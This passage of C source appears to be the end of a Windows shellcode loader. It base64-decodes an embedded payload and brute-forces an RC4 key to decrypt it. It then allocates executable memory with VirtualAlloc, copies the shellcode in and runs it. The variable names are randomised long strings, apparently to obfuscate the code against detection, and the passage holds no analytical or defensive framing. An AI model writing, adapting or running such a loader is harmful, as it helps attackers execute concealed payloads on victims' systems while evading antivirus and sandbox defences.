    unsigned char hSdrKqc00FGk6GPjwOpEBEj[8192];
    int kjmuiA3XYl9574tFxLFZ22TGM6QQNtoSawus39BCgqZ6v2AgtdlP4tqz6t3vn9MjVXMvCnaW91zMyjqhcbgIVuwDygHq5JFbzSqhCEBjBEfiaKtdFvdPbpzAUxNuyLwRf = sizeof(aCbEc8BuT) - 1;
    int Niwqjae4eArBAJhkFZKwHdgFPmIbEIKqn1IsTrmVDpuMQ3xUHQdRjSIkkg7Dr56YQVhfbXHsDY9QZgGYkw1RaF9Y4GU4vEf_eO2uEoDy9jzrSFMYG8yo_zWgn4qO5joQZPUSHlqTo049MmgL3WaBc7S2plyEBcpX2feENnA217uYCssRwRY_z2DQBcCpRugFLmqCWBTg7qS60Pp5O1z2axqfE1qkThZoQzY = 0;
    int SVzzacWNd = 0;
    
    printf("[~] RC4 key size: %d bytes\n", KEY_SIZE);
    printf("[~] Base64 payload size: %d bytes\n", kjmuiA3XYl9574tFxLFZ22TGM6QQNtoSawus39BCgqZ6v2AgtdlP4tqz6t3vn9MjVXMvCnaW91zMyjqhcbgIVuwDygHq5JFbzSqhCEBjBEfiaKtdFvdPbpzAUxNuyLwRf);
    
    
    printf("[~] Decoding base64 payload\n");
    int FJiRVuZjr5_jbUlwUc7D0w5b6PqJuuENRqy0XjkoPAsWz = vt7IcyxCZk8dGmpDa_qN3WG6rAdtwNU17qUlv3G0r2bH4IG0DiZiighQe4qLuBLvdkiGGzoXWBTlPtKK1vo689t7tNi58J0yaO96zsvP1d6fRw1ziossGgH3ImHSxduxY(aCbEc8BuT, kjmuiA3XYl9574tFxLFZ22TGM6QQNtoSawus39BCgqZ6v2AgtdlP4tqz6t3vn9MjVXMvCnaW91zMyjqhcbgIVuwDygHq5JFbzSqhCEBjBEfiaKtdFvdPbpzAUxNuyLwRf, hSdrKqc00FGk6GPjwOpEBEj);
    if (FJiRVuZjr5_jbUlwUc7D0w5b6PqJuuENRqy0XjkoPAsWz <= 0) {
        printf("[x] Base64 decode failed\n");
        return 1;
    }
    printf("[+] Base64 decoded: %d bytes\n", FJiRVuZjr5_jbUlwUc7D0w5b6PqJuuENRqy0XjkoPAsWz);
    
    printf("[~] Starting RC4 key bruteforce\n");
    
    
    memset(key, 0, sizeof(key));
    if (AOEl2oW1A3C3C8069HyReJhQ8Oa9Y0buEcXjWR6_eKqLsv_dg7aTbFtPec0vF4YN22bQ6UKIMZrfiLIvrn4vlpg3LwT0NenaCB42oy6qm1SYn2O202O9lKNqolKCE5pvOPzyXdO7JImUYJe4O2Yz0geYfJ8QfCYu2gMkVSk8DuFB59hwHvZI(key, 0, KEY_SIZE, hSdrKqc00FGk6GPjwOpEBEj, FJiRVuZjr5_jbUlwUc7D0w5b6PqJuuENRqy0XjkoPAsWz, Rt6oPU8KcaNs1FQLX3KGOvrm, &Niwqjae4eArBAJhkFZKwHdgFPmIbEIKqn1IsTrmVDpuMQ3xUHQdRjSIkkg7Dr56YQVhfbXHsDY9QZgGYkw1RaF9Y4GU4vEf_eO2uEoDy9jzrSFMYG8yo_zWgn4qO5joQZPUSHlqTo049MmgL3WaBc7S2plyEBcpX2feENnA217uYCssRwRY_z2DQBcCpRugFLmqCWBTg7qS60Pp5O1z2axqfE1qkThZoQzY)) {
        SVzzacWNd = 1;
    }
    
    if (SVzzacWNd && Niwqjae4eArBAJhkFZKwHdgFPmIbEIKqn1IsTrmVDpuMQ3xUHQdRjSIkkg7Dr56YQVhfbXHsDY9QZgGYkw1RaF9Y4GU4vEf_eO2uEoDy9jzrSFMYG8yo_zWgn4qO5joQZPUSHlqTo049MmgL3WaBc7S2plyEBcpX2feENnA217uYCssRwRY_z2DQBcCpRugFLmqCWBTg7qS60Pp5O1z2axqfE1qkThZoQzY > 0) {
        printf("[+] Payload decrypted successfully: %d bytes\n", Niwqjae4eArBAJhkFZKwHdgFPmIbEIKqn1IsTrmVDpuMQ3xUHQdRjSIkkg7Dr56YQVhfbXHsDY9QZgGYkw1RaF9Y4GU4vEf_eO2uEoDy9jzrSFMYG8yo_zWgn4qO5joQZPUSHlqTo049MmgL3WaBc7S2plyEBcpX2feENnA217uYCssRwRY_z2DQBcCpRugFLmqCWBTg7qS60Pp5O1z2axqfE1qkThZoQzY);
        printf("[~] Allocating executable memory\n");
        
        
        void *LebNuP_hkn7PAIWVGE_UlOPepAW0v1ZU55zFHw257BVXScYovJETVvv5IdJ8Zu_vUMJRtdQh5vJXe1k4YKYHoor7SxDWGEutcHK5Vme9Ef7oPHAJjyad7G2ntV2gY3hdPT2dUjKHA_eLjlXQjD9dN09Hcw2WtQXOPsaWxLXUNRnIm846l3P0Zwq9gdHFzcu8pi4goFGKAr57ws1l1Enqm34XuxLu_zQy4HtPr97rsy7A0zmGq = VirtualAlloc(0, Niwqjae4eArBAJhkFZKwHdgFPmIbEIKqn1IsTrmVDpuMQ3xUHQdRjSIkkg7Dr56YQVhfbXHsDY9QZgGYkw1RaF9Y4GU4vEf_eO2uEoDy9jzrSFMYG8yo_zWgn4qO5joQZPUSHlqTo049MmgL3WaBc7S2plyEBcpX2feENnA217uYCssRwRY_z2DQBcCpRugFLmqCWBTg7qS60Pp5O1z2axqfE1qkThZoQzY, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        if (LebNuP_hkn7PAIWVGE_UlOPepAW0v1ZU55zFHw257BVXScYovJETVvv5IdJ8Zu_vUMJRtdQh5vJXe1k4YKYHoor7SxDWGEutcHK5Vme9Ef7oPHAJjyad7G2ntV2gY3hdPT2dUjKHA_eLjlXQjD9dN09Hcw2WtQXOPsaWxLXUNRnIm846l3P0Zwq9gdHFzcu8pi4goFGKAr57ws1l1Enqm34XuxLu_zQy4HtPr97rsy7A0zmGq) {
            printf("[+] Memory allocated at: %p\n", LebNuP_hkn7PAIWVGE_UlOPepAW0v1ZU55zFHw257BVXScYovJETVvv5IdJ8Zu_vUMJRtdQh5vJXe1k4YKYHoor7SxDWGEutcHK5Vme9Ef7oPHAJjyad7G2ntV2gY3hdPT2dUjKHA_eLjlXQjD9dN09Hcw2WtQXOPsaWxLXUNRnIm846l3P0Zwq9gdHFzcu8pi4goFGKAr57ws1l1Enqm34XuxLu_zQy4HtPr97rsy7A0zmGq);
            printf("[~] Copying shellcode to memory\n");
            memcpy(LebNuP_hkn7PAIWVGE_UlOPepAW0v1ZU55zFHw257BVXScYovJETVvv5IdJ8Zu_vUMJRtdQh5vJXe1k4YKYHoor7SxDWGEutcHK5Vme9Ef7oPHAJjyad7G2ntV2gY3hdPT2dUjKHA_eLjlXQjD9dN09Hcw2WtQXOPsaWxLXUNRnIm846l3P0Zwq9gdHFzcu8pi4goFGKAr57ws1l1Enqm34XuxLu_zQy4HtPr97rsy7A0zmGq, Rt6oPU8KcaNs1FQLX3KGOvrm, Niwqjae4eArBAJhkFZKwHdgFPmIbEIKqn1IsTrmVDpuMQ3xUHQdRjSIkkg7Dr56YQVhfbXHsDY9QZgGYkw1RaF9Y4GU4vEf_eO2uEoDy9jzrSFMYG8yo_zWgn4qO5joQZPUSHlqTo049MmgL3WaBc7S2plyEBcpX2feENnA217uYCssRwRY_z2DQBcCpRugFLmqCWBTg7qS60Pp5O1z2axqfE1qkThZoQzY);
            printf("[~] Executing shellcode\n");
            ((void(*)())(LebNuP_hkn7PAIWVGE_UlOPepAW0v1ZU55zFHw257BVXScYovJETVvv5IdJ8Zu_vUMJRtdQh5vJXe1k4YKYHoor7SxDWGEutcHK5Vme9Ef7oPHAJjyad7G2ntV2gY3hdPT2dUjKHA_eLjlXQjD9dN09Hcw2WtQXOPsaWxLXUNRnIm846l3P0Zwq9gdHFzcu8pi4goFGKAr57ws1l1Enqm34XuxLu_zQy4HtPr97rsy7A0zmGq))();
        } else {
            printf("[x] Memory allocation failed\n");
        }
    } else {
        printf("[x] Failed to decrypt payload\n");
    }
    
    return 0;
}